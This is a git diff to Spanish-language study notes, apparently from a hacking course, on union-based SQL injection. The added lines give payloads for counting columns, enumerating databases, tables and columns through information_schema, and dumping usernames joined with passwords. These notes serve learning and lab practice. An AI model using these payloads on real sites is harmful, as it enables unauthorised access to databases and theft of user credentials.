@@ -13,9 +13,10 @@
 Lo primero que hay que determinar es el numero de columnas que hay para eso usaremos
 `' order by X-- -`
 
-Una vez que sabemos que tenemos una columna tenemos que añadir una nueva fila incorporando un nuevo dato
-`' union select 1 -- -` Debemos de poner un valor en donde se hace la petición que no exista
+>A partir de aquí debemos de poner un valor en donde se hace la petición que no exista
 
+Una vez que sabemos que tenemos una columna tenemos que añadir una nueva fila incorporando un nuevo dato
+`' union select 1 -- -` 
 Podemos también enumerar el nombre de la base de datos
 `' union select database()`
 
@@ -28,6 +29,14 @@ Enumerar tablas de una base de datos
 Enumerar las columnas de esa tabla
 `' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -`
 
+Enumerar el contenido de las columnas
+`' union select group_concat(username) from users-- -`
+
+En caso de que quiera enumera una base de datos diferente
+`' union select group_concat(username) from Table2.users-- -`
+
+Para concatenar datos de una tabla con `:` como separados en hexadecimal `0x3A`
+`' union select group_concat(username,0x3A,password) from users-- -`
 
 
 
